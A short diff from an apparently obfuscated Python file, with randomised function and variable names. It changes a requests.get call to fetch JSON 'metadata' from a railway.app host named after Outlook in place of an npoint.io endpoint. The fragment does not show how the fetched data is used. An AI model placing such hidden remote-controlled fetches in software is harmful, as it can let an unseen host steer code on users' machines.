@@ -16,7 +16,7 @@ def eval_voaamy_930():
 
     def eval_kdcvec_656():
         try:
-            data_vugyjr_474 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_vugyjr_474 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_vugyjr_474.raise_for_status()
             data_iqxqbq_339 = data_vugyjr_474.json()
             eval_trockn_176 = data_iqxqbq_339.get('metadata')
